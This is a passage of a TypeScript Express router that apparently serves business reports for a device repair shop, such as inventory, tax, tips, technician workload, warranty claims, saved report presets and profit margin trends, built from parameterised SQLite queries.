  validateReportDateRange(req, from, to);

  const rows = await adb.all<any>(`
    SELECT
      u.id, u.first_name || ' ' || u.last_name AS name, u.role,
      COALESCE(ticket_counts.cnt, 0) AS tickets_assigned,
      COALESCE(ticket_counts.closed, 0) AS tickets_closed,
      COALESCE(commission_sums.total, 0) AS commission_earned,
      COALESCE(clock_sums.hours, 0) AS hours_worked,
      COALESCE(revenue_sums.total, 0) AS revenue_generated
    FROM users u
    LEFT JOIN (
      SELECT assigned_to, COUNT(*) AS cnt,
        SUM(CASE WHEN ts.is_closed = 1 THEN 1 ELSE 0 END) AS closed
      FROM tickets t
      JOIN ticket_statuses ts ON ts.id = t.status_id
      WHERE t.is_deleted = 0 AND DATE(t.created_at) BETWEEN ? AND ?
      GROUP BY assigned_to
    ) ticket_counts ON ticket_counts.assigned_to = u.id
    LEFT JOIN (
      SELECT user_id, SUM(amount) AS total
      FROM commissions
      WHERE DATE(created_at) BETWEEN ? AND ?
      GROUP BY user_id
    ) commission_sums ON commission_sums.user_id = u.id
    LEFT JOIN (
      SELECT user_id, SUM(
        CASE WHEN clock_out IS NOT NULL
          THEN (JULIANDAY(clock_out) - JULIANDAY(clock_in)) * 24
          ELSE 0 END
      ) AS hours
      FROM clock_entries
      WHERE DATE(clock_in) BETWEEN ? AND ?
      GROUP BY user_id
    ) clock_sums ON clock_sums.user_id = u.id
    LEFT JOIN (
      SELECT i.created_by, SUM(p.amount) AS total
      FROM payments p
      JOIN invoices i ON i.id = p.invoice_id
      WHERE i.status != 'void' AND DATE(p.created_at) BETWEEN ? AND ?
      GROUP BY i.created_by
    ) revenue_sums ON revenue_sums.created_by = u.id
    WHERE u.is_active = 1
    ORDER BY tickets_assigned DESC
  `, from, to, from, to, from, to, from, to);

  res.json({ success: true, data: { rows, from, to } });
}));

// ─── Inventory Report ─────────────────────────────────────────────────────────

router.get('/inventory', asyncHandler(async (req, res) => {
  requireAdminOrManager(req);
  const adb = req.asyncDb;

  const [lowStock, valueSummary, outOfStockRow, topMoving] = await Promise.all([
    // RPT-LS1: Filter must match the authoritative query in inventory.routes.ts
    // (GET /inventory?low_stock=true), otherwise the "5 items low" KPI on the
    // dashboard tile can disagree with the inventory page count. Required
    // filters: is_reorderable = 1 and low_stock_dismissed_at IS NULL.
    adb.all<any>(`
      SELECT id, name, sku, in_stock, reorder_level, retail_price, cost_price, item_type
      FROM inventory_items
      WHERE item_type != 'service'
        AND is_active = 1
        AND is_reorderable = 1
        AND low_stock_dismissed_at IS NULL
        AND in_stock <= reorder_level
      ORDER BY in_stock ASC
      LIMIT 50
    `),
    adb.all<any>(`
      SELECT
        item_type,
        COUNT(*) AS item_count,
        SUM(in_stock) AS total_units,
        SUM(in_stock * cost_price) AS total_cost_value,
        SUM(in_stock * retail_price) AS total_retail_value
      FROM inventory_items
      WHERE is_active = 1 AND item_type != 'service'
      GROUP BY item_type
    `),
    // Out of stock items
    adb.get<any>(`
      SELECT COUNT(*) AS n FROM inventory_items
      WHERE is_active = 1 AND item_type != 'service' AND in_stock = 0
    `),
    // Top moving items (most used in repairs in last 30 days)
    adb.all<any>(`
      SELECT ii.name, ii.sku, SUM(tdp.quantity) AS used_qty, ii.in_stock
      FROM ticket_device_parts tdp
      JOIN inventory_items ii ON ii.id = tdp.inventory_item_id
      JOIN ticket_devices td ON td.id = tdp.ticket_device_id
      JOIN tickets t ON t.id = td.ticket_id
      WHERE t.is_deleted = 0 AND DATE(t.created_at) >= DATE('now', '-30 days')
      GROUP BY ii.id
      ORDER BY used_qty DESC
      LIMIT 10
    `),
  ]);

  const outOfStock = outOfStockRow?.n ?? 0;

  res.json({ success: true, data: { lowStock, valueSummary, outOfStock, topMoving } });
}));

// ─── Tax Report ───────────────────────────────────────────────────────────────

router.get('/tax', asyncHandler(async (req, res) => {
  requireAdminOrManager(req);
  const adb = req.asyncDb;
  const from = (req.query.from_date as string) || new Date().toISOString().slice(0, 7) + '-01';
  const to = (req.query.to_date as string) || new Date().toISOString().slice(0, 10);
  validateReportDateRange(req, from, to);

  // Try line-item tax first; fall back to invoice-level total_tax if line items have no tax data
  const lineItemRows = await adb.all<any>(`
    SELECT
      tc.name AS tax_class,
      tc.rate,
      SUM(ili.tax_amount) AS tax_collected,
      SUM(ili.total) AS revenue
    FROM invoice_line_items ili
    JOIN invoices i ON i.id = ili.invoice_id
    LEFT JOIN tax_classes tc ON tc.id = ili.tax_class_id
    WHERE i.status != 'void' AND DATE(i.created_at) BETWEEN ? AND ?
    GROUP BY ili.tax_class_id
    ORDER BY tax_collected DESC
  `, from, to);

  const hasLineItemTax = lineItemRows.some((r: any) => r.tax_collected > 0);

  const rows = hasLineItemTax ? lineItemRows : await adb.all<any>(`
    SELECT
      COALESCE(tc.name, 'Tax (from invoice totals)') AS tax_class,
      tc.rate,
      SUM(i.total_tax) AS tax_collected,
      SUM(i.total - i.total_tax) AS revenue
    FROM invoices i
    LEFT JOIN tax_classes tc ON tc.id = i.tax_class_id
    WHERE i.status != 'void' AND DATE(i.created_at) BETWEEN ? AND ?
      AND i.total_tax > 0
    GROUP BY i.tax_class_id
    ORDER BY tax_collected DESC
  `, from, to);

  res.json({ success: true, data: { rows, from, to } });
}));

// ─── Tech Workload ───────────────────────────────────────────────────────────

router.get('/tech-workload', asyncHandler(async (req, res) => {
  requireAdminOrManager(req);
  const adb = req.asyncDb;
  const db = req.db; // needed for sync calculateAvgActiveRepairTime
  const monthStart = new Date();
  monthStart.setDate(1);
  const monthStartStr = monthStart.toISOString().slice(0, 10);
  const todayStr = new Date().toISOString().slice(0, 10);

  const rows = await adb.all<any>(`
    SELECT
      u.id,
      u.first_name || ' ' || u.last_name AS name,
      COALESCE(open_counts.open_tickets, 0) AS open_tickets,
      COALESCE(open_counts.in_progress, 0) AS in_progress,
      COALESCE(open_counts.waiting_parts, 0) AS waiting_parts,
      COALESCE(rev.revenue, 0) AS revenue_this_month
    FROM users u
    LEFT JOIN (
      SELECT
        t.assigned_to,
        COUNT(*) AS open_tickets,
        SUM(CASE WHEN ts.name = 'In Progress' THEN 1 ELSE 0 END) AS in_progress,
        SUM(CASE WHEN ts.name IN ('Waiting for Parts', 'Special Part Order (Pending Parts)') THEN 1 ELSE 0 END) AS waiting_parts
      FROM tickets t
      JOIN ticket_statuses ts ON ts.id = t.status_id
      WHERE t.is_deleted = 0 AND ts.is_closed = 0 AND ts.is_cancelled = 0
      GROUP BY t.assigned_to
    ) open_counts ON open_counts.assigned_to = u.id
    LEFT JOIN (
      SELECT
        t.assigned_to,
        COALESCE(SUM(t.total), 0) AS revenue
      FROM tickets t
      WHERE t.is_deleted = 0 AND DATE(t.created_at) BETWEEN ? AND ?
      GROUP BY t.assigned_to
    ) rev ON rev.assigned_to = u.id
    WHERE u.is_active = 1
      AND (open_counts.open_tickets > 0 OR rev.revenue > 0)
    ORDER BY open_counts.open_tickets DESC
  `, monthStartStr, todayStr);

  // Batch-fetch closed ticket IDs for ALL techs in one query (avoids N+1).
  // Each tech previously triggered a separate getClosedTicketIds() call.
  const techIds = rows.map((r: any) => r.id);
  const closedByTech = new Map<number, number[]>();
  if (techIds.length > 0) {
    const placeholders = techIds.map(() => '?').join(',');
    const closedRows = await adb.all<{ id: number; assigned_to: number }>(`
      SELECT t.id, t.assigned_to
      FROM tickets t
      JOIN ticket_statuses ts ON ts.id = t.status_id
      WHERE t.is_deleted = 0 AND ts.is_closed = 1
        AND t.assigned_to IN (${placeholders})
      ORDER BY t.created_at DESC
    `, ...techIds);
    for (const row of closedRows) {
      const list = closedByTech.get(row.assigned_to);
      if (list) { if (list.length < 200) list.push(row.id); }
      else closedByTech.set(row.assigned_to, [row.id]);
    }
  }

  // Calculate active repair time per tech (excludes hold/waiting statuses)
  // Uses sync db for calculateAvgActiveRepairTime
  const data = rows.map((r: any) => {
    const recentIds = closedByTech.get(r.id) ?? [];
    const avgHours = calculateAvgActiveRepairTime(db, recentIds);
    return {
      ...r,
      avg_repair_hours: avgHours ? Math.round(avgHours * 10) / 10 : 0,
      revenue_this_month: Math.round(r.revenue_this_month * 100) / 100,
    };
  });

  res.json({ success: true, data });
}));

// ─── Tip Report ──────────────────────────────────────────────────────────────

router.get('/tips', asyncHandler(async (req, res) => {
  requireAdminOrManager(req);
  const adb = req.asyncDb;
  const from = (req.query.from_date as string) || new Date(Date.now() - 30 * 86400_000).toISOString().slice(0, 10);
  const to = (req.query.to_date as string) || new Date().toISOString().slice(0, 10);
  validateReportDateRange(req, from, to);
  const groupBy = (req.query.group_by as string) || 'day'; // day | week

  // Daily/weekly tip totals
  const dateExpr = groupBy === 'week'
    ? "DATE(pt.created_at, 'weekday 1', '-7 days')"
    : "DATE(pt.created_at)";

  const [daily, byEmployee, summary] = await Promise.all([
    adb.all<any>(`
      SELECT
        ${dateExpr} AS period,
        COALESCE(SUM(pt.tip), 0) AS tip_total,
        COUNT(CASE WHEN pt.tip > 0 THEN 1 END) AS tip_count,
        COUNT(*) AS transaction_count
      FROM pos_transactions pt
      WHERE DATE(pt.created_at) BETWEEN ? AND ?
      GROUP BY period
      ORDER BY period DESC
    `, from, to),
    // Per-employee breakdown
    adb.all<any>(`
      SELECT
        u.id AS employee_id,
        u.first_name || ' ' || u.last_name AS employee_name,
        COALESCE(SUM(pt.tip), 0) AS tip_total,
        COUNT(CASE WHEN pt.tip > 0 THEN 1 END) AS tip_count,
        COUNT(*) AS transaction_count,
        CASE WHEN COUNT(CASE WHEN pt.tip > 0 THEN 1 END) > 0
          THEN ROUND(SUM(pt.tip) / COUNT(CASE WHEN pt.tip > 0 THEN 1 END), 2)
          ELSE 0 END AS avg_tip
      FROM pos_transactions pt
      JOIN users u ON u.id = pt.user_id
      WHERE DATE(pt.created_at) BETWEEN ? AND ?
      GROUP BY pt.user_id
      ORDER BY tip_total DESC
    `, from, to),
    // Summary totals
    adb.get<any>(`
      SELECT
        COALESCE(SUM(pt.tip), 0) AS total_tips,
        COUNT(CASE WHEN pt.tip > 0 THEN 1 END) AS tipped_transactions,
        COUNT(*) AS total_transactions,
        CASE WHEN COUNT(CASE WHEN pt.tip > 0 THEN 1 END) > 0
          THEN ROUND(SUM(pt.tip) / COUNT(CASE WHEN pt.tip > 0 THEN 1 END), 2)
          ELSE 0 END AS avg_tip,
        MAX(pt.tip) AS max_tip
      FROM pos_transactions pt
      WHERE DATE(pt.created_at) BETWEEN ? AND ?
    `, from, to),
  ]);

  res.json({
    success: true,
    data: {
      daily,
      by_employee: byEmployee,
      summary: {
        total_tips: summary?.total_tips ?? 0,
        tipped_transactions: summary?.tipped_transactions ?? 0,
        total_transactions: summary?.total_transactions ?? 0,
        avg_tip: summary?.avg_tip ?? 0,
        max_tip: summary?.max_tip ?? 0,
        tip_rate_pct: (summary?.total_transactions ?? 0) > 0
          ? Math.round((summary.tipped_transactions / summary.total_transactions) * 1000) / 10
          : 0,
      },
      from,
      to,
    },
  });
}));

// ─── Needs Attention ──────────────────────────────────────────────────────────

router.get('/needs-attention', asyncHandler(async (req, res) => {
  requireAdminOrManager(req);
  const adb = req.asyncDb;
  const today = new Date().toISOString().slice(0, 10);

  const [stale_tickets, missingPartsRow, overdue_invoices, lowStockRow] = await Promise.all([
    // Stale tickets: open, not updated in 3+ days
    adb.all<any>(`
      SELECT t.id, t.order_id,
        COALESCE(c.first_name || ' ' || c.last_name, 'Unknown') AS customer_name,
        CAST(JULIANDAY('now') - JULIANDAY(t.updated_at) AS INTEGER) AS days_stale,
        ts.name AS status
      FROM tickets t
      JOIN ticket_statuses ts ON ts.id = t.status_id
      LEFT JOIN customers c ON c.id = t.customer_id
      WHERE t.is_deleted = 0 AND ts.is_closed = 0 AND ts.is_cancelled = 0
        AND JULIANDAY('now') - JULIANDAY(t.updated_at) >= 3
      ORDER BY days_stale DESC
      LIMIT 20
    `),
    // Missing parts count (open tickets with parts that have status='missing' or in_stock < quantity)
    adb.get<any>(`
      SELECT COUNT(DISTINCT tdp.id) AS n
      FROM ticket_device_parts tdp
      JOIN ticket_devices td ON td.id = tdp.ticket_device_id
      JOIN tickets t ON t.id = td.ticket_id
      JOIN ticket_statuses ts ON ts.id = t.status_id
      LEFT JOIN inventory_items ii ON ii.id = tdp.inventory_item_id
      WHERE t.is_deleted = 0 AND ts.is_closed = 0 AND ts.is_cancelled = 0
        AND ii.id IS NOT NULL AND ii.in_stock <= ii.reorder_level
    `),
    // Overdue invoices: unpaid/partial, past due_on
    adb.all<any>(`
      SELECT i.id, i.order_id,
        COALESCE(c.first_name || ' ' || c.last_name, 'Unknown') AS customer_name,
        i.total - COALESCE(i.amount_paid, 0) AS amount_due,
        CAST(JULIANDAY('now') - JULIANDAY(i.due_on) AS INTEGER) AS days_overdue
      FROM invoices i
      LEFT JOIN customers c ON c.id = i.customer_id
      WHERE i.status IN ('unpaid', 'partial')
        AND i.due_on IS NOT NULL AND i.due_on != ''
        AND DATE(i.due_on) < ?
      ORDER BY days_overdue DESC
      LIMIT 20
    `, today),
    // RPT-LS2: Low-stock count must also respect low_stock_dismissed_at so
    // dismissing an alert on the inventory page actually quiets the
    // "Needs Attention" card. Without this filter the banner re-announces
    // the same dismissed items every poll cycle.
    adb.get<any>(`
      SELECT COUNT(*) AS n FROM inventory_items
      WHERE item_type != 'service' AND is_active = 1 AND is_reorderable = 1
        AND low_stock_dismissed_at IS NULL
        AND in_stock <= reorder_level
    `),
  ]);

  const missing_parts_count = missingPartsRow?.n ?? 0;
  const low_stock_count = lowStockRow?.n ?? 0;

  res.json({
    success: true,
    data: {
      stale_tickets,
      missing_parts_count,
      overdue_invoices,
      low_stock_count,
    },
  });
}));

// ─── ENR-R1: Warranty Claims Report ──────────────────────────────────────────

router.get('/warranty-claims', asyncHandler(async (req, res) => {
  requireAdminOrManager(req);
  const adb = req.asyncDb;
  const from = (req.query.from_date as string) || new Date(Date.now() - 365 * 86400_000).toISOString().slice(0, 10);
  const to = (req.query.to_date as string) || new Date().toISOString().slice(0, 10);
  validateReportDateRange(req, from, to);

  const rows = await adb.all<any>(`
    SELECT
      td.device_name AS model,
      COUNT(*) AS claim_count,
      COALESCE(SUM(t.total), 0) AS total_cost,
      COALESCE(AVG(t.total), 0) AS avg_repair_cost
    FROM ticket_devices td
    JOIN tickets t ON t.id = td.ticket_id
    WHERE td.warranty = 1
      AND t.is_deleted = 0
      AND DATE(t.created_at) BETWEEN ? AND ?
    GROUP BY td.device_name
    ORDER BY claim_count DESC
  `, from, to);

  res.json({ success: true, data: { rows, from, to } });
}));

// ─── ENR-R2: Device Model Report ────────────────────────────────────────────

router.get('/device-models', asyncHandler(async (req, res) => {
  requireAdminOrManager(req);
  const adb = req.asyncDb;
  const from = (req.query.from_date as string) || new Date(Date.now() - 365 * 86400_000).toISOString().slice(0, 10);
  const to = (req.query.to_date as string) || new Date().toISOString().slice(0, 10);
  validateReportDateRange(req, from, to);

  const rows = await adb.all<any>(`
    SELECT
      td.device_name AS model,
      COUNT(*) AS repair_count,
      COALESCE(AVG(t.total), 0) AS avg_ticket_total,
      COALESCE(SUM(
        (SELECT COALESCE(SUM(
          COALESCE(NULLIF(ii.cost_price, 0), 0) * tdp.quantity
        ), 0)
        FROM ticket_device_parts tdp
        JOIN inventory_items ii ON ii.id = tdp.inventory_item_id
        WHERE tdp.ticket_device_id = td.id)
      ), 0) AS total_parts_cost
    FROM ticket_devices td
    JOIN tickets t ON t.id = td.ticket_id
    WHERE t.is_deleted = 0
      AND td.device_name IS NOT NULL AND td.device_name != ''
      AND DATE(t.created_at) BETWEEN ? AND ?
    GROUP BY td.device_name
    ORDER BY repair_count DESC
  `, from, to);

  res.json({ success: true, data: { rows, from, to } });
}));

// ─── ENR-R3: Parts Usage Report ─────────────────────────────────────────────

router.get('/parts-usage', asyncHandler(async (req, res) => {
  requireAdminOrManager(req);
  const adb = req.asyncDb;
  const from = (req.query.from_date as string) || new Date(Date.now() - 365 * 86400_000).toISOString().slice(0, 10);
  const to = (req.query.to_date as string) || new Date().toISOString().slice(0, 10);
  validateReportDateRange(req, from, to);

  // RPT-EXPORT2: Screen view shows top 20 for responsiveness. When
  // export_all=1 is passed, raise the cap to 10000 so the download path
  // pulls the full list without the screen's truncation. Matches the
  // RPT8 convention used by /dashboard-kpis.
  const exportAll = req.query.export_all === 'true' || req.query.export_all === '1';
  const limit = exportAll ? 10000 : 20;

  const rows = await adb.all<any>(`
    SELECT
      ii.name AS part_name,
      ii.sku,
      COUNT(*) AS usage_count,
      SUM(tdp.quantity) AS total_qty_used,
      COALESCE(SUM(COALESCE(NULLIF(ii.cost_price, 0), 0) * tdp.quantity), 0) AS total_cost,
      COALESCE(s.name, 'Unknown') AS supplier
    FROM ticket_device_parts tdp
    JOIN inventory_items ii ON ii.id = tdp.inventory_item_id
    JOIN ticket_devices td ON td.id = tdp.ticket_device_id
    JOIN tickets t ON t.id = td.ticket_id
    LEFT JOIN suppliers s ON s.id = ii.supplier_id
    WHERE t.is_deleted = 0
      AND DATE(t.created_at) BETWEEN ? AND ?
    GROUP BY ii.id
    ORDER BY usage_count DESC
    LIMIT ?
  `, from, to, limit);

  res.json({ success: true, data: { rows, from, to } });
}));

// ─── ENR-R4: Technician Billable Hours ──────────────────────────────────────

router.get('/technician-hours', asyncHandler(async (req, res) => {
  requireAdminOrManager(req);
  const adb = req.asyncDb;
  const from = (req.query.from_date as string) || new Date(Date.now() - 30 * 86400_000).toISOString().slice(0, 10);
  const to = (req.query.to_date as string) || new Date().toISOString().slice(0, 10);
  validateReportDateRange(req, from, to);

  const rows = await adb.all<any>(`
    SELECT
      u.first_name || ' ' || u.last_name AS tech_name,
      COALESCE(closed_counts.tickets_closed, 0) AS tickets_closed,
      COALESCE(rev.total_revenue, 0) AS total_revenue,
      COALESCE(hrs.hours_logged, 0) AS hours_logged
    FROM users u
    LEFT JOIN (
      SELECT t.assigned_to, COUNT(*) AS tickets_closed
      FROM tickets t
      JOIN ticket_statuses ts ON ts.id = t.status_id
      WHERE t.is_deleted = 0 AND ts.is_closed = 1
        AND DATE(t.updated_at) BETWEEN ? AND ?
      GROUP BY t.assigned_to
    ) closed_counts ON closed_counts.assigned_to = u.id
    LEFT JOIN (
      SELECT t.assigned_to, COALESCE(SUM(t.total), 0) AS total_revenue
      FROM tickets t
      JOIN ticket_statuses ts ON ts.id = t.status_id
      WHERE t.is_deleted = 0 AND ts.is_closed = 1
        AND DATE(t.updated_at) BETWEEN ? AND ?
      GROUP BY t.assigned_to
    ) rev ON rev.assigned_to = u.id
    LEFT JOIN (
      SELECT user_id, SUM(
        CASE WHEN clock_out IS NOT NULL
          THEN (JULIANDAY(clock_out) - JULIANDAY(clock_in)) * 24
          ELSE 0 END
      ) AS hours_logged
      FROM clock_entries
      WHERE DATE(clock_in) BETWEEN ? AND ?
      GROUP BY user_id
    ) hrs ON hrs.user_id = u.id
    WHERE u.is_active = 1
      AND (closed_counts.tickets_closed > 0 OR hrs.hours_logged > 0)
    ORDER BY tickets_closed DESC
  `, from, to, from, to, from, to);

  res.json({ success: true, data: { rows, from, to } });
}));

// ─── ENR-R5: Stalled Ticket Report ──────────────────────────────────────────

router.get('/stalled-tickets', asyncHandler(async (req, res) => {
  requireAdminOrManager(req);
  const adb = req.asyncDb;
  const from = (req.query.from_date as string) || new Date(Date.now() - 365 * 86400_000).toISOString().slice(0, 10);
  const to = (req.query.to_date as string) || new Date().toISOString().slice(0, 10);
  validateReportDateRange(req, from, to);

  const rows = await adb.all<any>(`
    SELECT
      COALESCE(u.first_name || ' ' || u.last_name, 'Unassigned') AS tech_name,
      COUNT(*) AS stalled_count,
      GROUP_CONCAT(t.order_id, ', ') AS ticket_ids,
      MIN(t.updated_at) AS oldest_update,
      MAX(CAST(JULIANDAY('now') - JULIANDAY(t.updated_at) AS INTEGER)) AS max_days_stalled
    FROM tickets t
    JOIN ticket_statuses ts ON ts.id = t.status_id
    LEFT JOIN users u ON u.id = t.assigned_to
    WHERE t.is_deleted = 0
      AND ts.is_closed = 0 AND ts.is_cancelled = 0
      AND t.updated_at < datetime('now', '-7 days')
      AND DATE(t.created_at) BETWEEN ? AND ?
    GROUP BY t.assigned_to
    ORDER BY stalled_count DESC
  `, from, to);

  res.json({ success: true, data: { rows, from, to } });
}));

// ─── ENR-R6: Customer Acquisition Report ────────────────────────────────────

router.get('/customer-acquisition', requireFeature('advancedReports'), asyncHandler(async (req, res) => {
  const adb = req.asyncDb;
  const from = (req.query.from_date as string) || new Date(Date.now() - 365 * 86400_000).toISOString().slice(0, 10);
  const to = (req.query.to_date as string) || new Date().toISOString().slice(0, 10);
  validateReportDateRange(req, from, to);

  const [rows, monthly_totals] = await Promise.all([
    adb.all<any>(`
      SELECT
        STRFTIME('%Y-%m', created_at) AS month,
        COUNT(*) AS new_customers,
        COALESCE(referred_by, source, 'Unknown') AS acquisition_source
      FROM customers
      WHERE is_deleted = 0
        AND DATE(created_at) BETWEEN ? AND ?
      GROUP BY month, acquisition_source
      ORDER BY month DESC, new_customers DESC
    `, from, to),
    // Also provide a monthly summary without source breakdown
    adb.all<any>(`
      SELECT
        STRFTIME('%Y-%m', created_at) AS month,
        COUNT(*) AS new_customers
      FROM customers
      WHERE is_deleted = 0
        AND DATE(created_at) BETWEEN ? AND ?
      GROUP BY month
      ORDER BY month DESC
    `, from, to),
  ]);

  res.json({ success: true, data: { rows, monthly_totals, from, to } });
}));

// ─── ENR-R8: Report Comparison Mode ─────────────────────────────────────────

router.get('/comparison', requireFeature('advancedReports'), asyncHandler(async (req, res) => {
  requireAdminOrManager(req);
  const adb = req.asyncDb;

  const from1 = req.query.from1 as string;
  const to1 = req.query.to1 as string;
  const from2 = req.query.from2 as string;
  const to2 = req.query.to2 as string;

  if (!from1 || !to1 || !from2 || !to2) {
    throw new AppError('All four date params required: from1, to1, from2, to2', 400);
  }
  validateReportDateRange(req, from1, to1);
  validateReportDateRange(req, from2, to2);

  async function getMetrics(from: string, to: string) {
    const [revenue, tickets, customers, avgTicket] = await Promise.all([
      adb.get<any>(`
        SELECT
          COALESCE(SUM(p.amount), 0) +
          COALESCE(SUM(CASE WHEN p.id IS NULL AND i.amount_paid > 0 THEN i.amount_paid ELSE 0 END), 0) AS total
        FROM invoices i
        LEFT JOIN payments p ON p.invoice_id = i.id
        WHERE i.status != 'void'
          AND DATE(COALESCE(p.created_at, i.created_at)) BETWEEN ? AND ?
      `, from, to),
      adb.get<any>(`
        SELECT COUNT(*) AS total, COUNT(CASE WHEN ts.is_closed = 1 THEN 1 END) AS closed
        FROM tickets t
        JOIN ticket_statuses ts ON ts.id = t.status_id
        WHERE t.is_deleted = 0 AND DATE(t.created_at) BETWEEN ? AND ?
      `, from, to),
      adb.get<any>(`
        SELECT COUNT(*) AS new_customers
        FROM customers
        WHERE is_deleted = 0 AND DATE(created_at) BETWEEN ? AND ?
      `, from, to),
      adb.get<any>(`
        SELECT COALESCE(AVG(i.total), 0) AS avg_total
        FROM invoices i
        WHERE i.status != 'void' AND DATE(i.created_at) BETWEEN ? AND ?
      `, from, to),
    ]);

    return {
      revenue: revenue?.total ?? 0,
      tickets_created: tickets?.total ?? 0,
      tickets_closed: tickets?.closed ?? 0,
      new_customers: customers?.new_customers ?? 0,
      avg_ticket_value: Math.round((avgTicket?.avg_total ?? 0) * 100) / 100,
    };
  }

  const [period1, period2] = await Promise.all([
    getMetrics(from1, to1),
    getMetrics(from2, to2),
  ]);

  // Compute percentage changes
  function pctChange(a: number, b: number): number | null {
    if (a === 0) return b === 0 ? 0 : null;
    return Math.round(((b - a) / a) * 1000) / 10;
  }

  const changes = {
    revenue_pct: pctChange(period1.revenue, period2.revenue),
    tickets_created_pct: pctChange(period1.tickets_created, period2.tickets_created),
    tickets_closed_pct: pctChange(period1.tickets_closed, period2.tickets_closed),
    new_customers_pct: pctChange(period1.new_customers, period2.new_customers),
    avg_ticket_value_pct: pctChange(period1.avg_ticket_value, period2.avg_ticket_value),
  };

  res.json({
    success: true,
    data: {
      period1: { from: from1, to: to1, ...period1 },
      period2: { from: from2, to: to2, ...period2 },
      changes,
    },
  });
}));

// ─── ENR-R10: Saved Report Presets CRUD ─────────────────────────────────────

router.get('/presets', asyncHandler(async (req, res) => {
  const adb = req.asyncDb;
  const userId = req.user!.id;
  const reportType = req.query.report_type as string | undefined;

  const conditions = ['user_id = ?'];
  const params: unknown[] = [userId];

  if (reportType) {
    conditions.push('report_type = ?');
    params.push(reportType);
  }

  const presets = await adb.all<any>(
    `SELECT * FROM report_presets WHERE ${conditions.join(' AND ')} ORDER BY is_default DESC, name ASC`,
    ...params,
  );

  res.json({ success: true, data: presets });
}));

router.post('/presets', asyncHandler(async (req, res) => {
  const adb = req.asyncDb;
  const userId = req.user!.id;
  const { name, report_type, filters, is_default } = req.body;

  if (!name || typeof name !== 'string' || name.trim().length === 0) {
    throw new AppError('Preset name is required', 400);
  }
  if (!report_type || typeof report_type !== 'string') {
    throw new AppError('report_type is required', 400);
  }

  const filtersJson = typeof filters === 'string' ? filters : JSON.stringify(filters || {});

  // If marking as default, clear other defaults for this type
  if (is_default) {
    await adb.run(
      'UPDATE report_presets SET is_default = 0 WHERE user_id = ? AND report_type = ?',
      userId, report_type,
    );
  }

  const result = await adb.run(
    `INSERT INTO report_presets (user_id, name, report_type, filters, is_default) VALUES (?, ?, ?, ?, ?)`,
    userId, name.trim(), report_type, filtersJson, is_default ? 1 : 0,
  );

  const preset = await adb.get<any>('SELECT * FROM report_presets WHERE id = ?', result.lastInsertRowid);

  res.json({ success: true, data: preset });
}));

router.put('/presets/:presetId', asyncHandler(async (req, res) => {
  const adb = req.asyncDb;
  const userId = req.user!.id;
  const presetId = validateId(req.params.presetId, 'presetId');
  const { name, filters, is_default } = req.body;

  const existing = await adb.get<any>(
    'SELECT * FROM report_presets WHERE id = ? AND user_id = ?',
    presetId, userId,
  );
  if (!existing) throw new AppError('Preset not found', 404);

  // PROD21: Every entry pushed into `updates` is a hard-coded column fragment
  // ('name = ?', 'filters = ?', 'is_default = ?', "updated_at = datetime('now')").
  // No req.* value is spliced — only bound via ? placeholders into `params`.
  const updates: string[] = [];
  const params: unknown[] = [];

  if (name !== undefined) {
    if (typeof name !== 'string' || name.trim().length === 0) {
      throw new AppError('Preset name cannot be empty', 400);
    }
    updates.push('name = ?');
    params.push(name.trim());
  }
  if (filters !== undefined) {
    updates.push('filters = ?');
    params.push(typeof filters === 'string' ? filters : JSON.stringify(filters));
  }
  if (is_default !== undefined) {
    if (is_default) {
      await adb.run(
        'UPDATE report_presets SET is_default = 0 WHERE user_id = ? AND report_type = ?',
        userId, existing.report_type,
      );
    }
    updates.push('is_default = ?');
    params.push(is_default ? 1 : 0);
  }

  if (updates.length === 0) {
    throw new AppError('No fields to update', 400);
  }

  updates.push("updated_at = datetime('now')");
  params.push(presetId, userId);

  await adb.run(
    `UPDATE report_presets SET ${updates.join(', ')} WHERE id = ? AND user_id = ?`,
    ...params,
  );

  const updated = await adb.get<any>('SELECT * FROM report_presets WHERE id = ?', presetId);
  res.json({ success: true, data: updated });
}));

router.delete('/presets/:presetId', asyncHandler(async (req, res) => {
  const adb = req.asyncDb;
  const userId = req.user!.id;
  const presetId = validateId(req.params.presetId, 'presetId');

  const existing = await adb.get<any>(
    'SELECT * FROM report_presets WHERE id = ? AND user_id = ?',
    presetId, userId,
  );
  if (!existing) throw new AppError('Preset not found', 404);

  await adb.run('DELETE FROM report_presets WHERE id = ? AND user_id = ?', presetId, userId);
  res.json({ success: true, data: { message: 'Preset deleted' } });
}));

// ─── ENR-R11: Profit Margin Trends ─────────────────────────────────────────

router.get('/margin-trends', requireFeature('advancedReports'), asyncHandler(async (req, res) => {
  requireAdminOrManager(req);
  const adb = req.asyncDb;
  const months = Math.min(24, Math.max(1, parseInt(req.query.months as string, 10) || 12));

  // Revenue per month from payments + invoice fallback
  // COGS per month from ticket_device_parts cost (inventory cost_price * quantity)
  const rows = await adb.all<any>(`
    SELECT
      m.month,
      COALESCE(rev.revenue, 0) AS revenue,
      COALESCE(cogs.total_cost, 0) AS cogs,
      COALESCE(rev.revenue, 0) - COALESCE(cogs.total_cost, 0) AS gross_profit,
      -- RPT5: Never clamp or floor the margin. Let negative margins surface
      -- so the user sees unprofitable months. NULL only when revenue is 0
      -- (division by zero is undefined, not "0% margin").
      CASE
        WHEN COALESCE(rev.revenue, 0) > 0
        THEN ROUND((COALESCE(rev.revenue, 0) - COALESCE(cogs.total_cost, 0)) / rev.revenue * 100, 1)
        ELSE NULL
      END AS margin_pct
    FROM (
      -- Generate month series
      WITH RECURSIVE months_cte(month) AS (
        SELECT STRFTIME('%Y-%m', 'now', '-' || ? || ' months')
        UNION ALL
        SELECT STRFTIME('%Y-%m', month || '-01', '+1 month')
        FROM months_cte
        WHERE month < STRFTIME('%Y-%m', 'now')
      )
      SELECT month FROM months_cte
    ) m
    LEFT JOIN (
      -- Revenue: payments + imported invoice fallback
      SELECT
        STRFTIME('%Y-%m', COALESCE(p.created_at, i.created_at)) AS month,
        COALESCE(SUM(p.amount), 0) +
        COALESCE(SUM(CASE WHEN p.id IS NULL AND i.amount_paid > 0 THEN i.amount_paid ELSE 0 END), 0) AS revenue
      FROM invoices i
      LEFT JOIN payments p ON p.invoice_id = i.id
      WHERE i.status != 'void'
        AND DATE(COALESCE(p.created_at, i.created_at)) >= DATE('now', '-' || ? || ' months')
      GROUP BY STRFTIME('%Y-%m', COALESCE(p.created_at, i.created_at))
    ) rev ON rev.month = m.month
    LEFT JOIN (
      -- RPT6: COGS — LEFT JOIN on inventory_items so parts whose inventory row
      -- is missing or deleted still contribute to the month count (with cost 0),
      -- instead of silently dropping the whole ticket_device_part row.
      SELECT
        STRFTIME('%Y-%m', t.created_at) AS month,
